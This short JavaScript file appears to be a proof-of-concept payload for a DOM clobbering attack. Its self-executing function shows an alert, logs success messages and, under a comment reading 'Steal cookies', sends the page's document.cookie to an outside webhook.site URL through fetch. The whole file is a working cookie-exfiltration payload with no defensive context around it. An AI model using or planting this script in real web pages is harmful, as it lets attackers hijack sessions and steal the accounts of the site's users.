// Self-executing function
(function() {
    // Prove execution
    alert("🚨 DOM Clobbering Exploit Executed!");
    console.log("✅ Script executed successfully!");
    
    // Steal cookies
    if (document.cookie) {
        fetch('https://webhook.site/a85315b7-2be0-4070-b137-a3bda5f1ab12?cookies=' + encodeURIComponent(document.cookie));
    }
    
    // Show attack chain
    console.log("✅ Attack Chain Complete!");
})();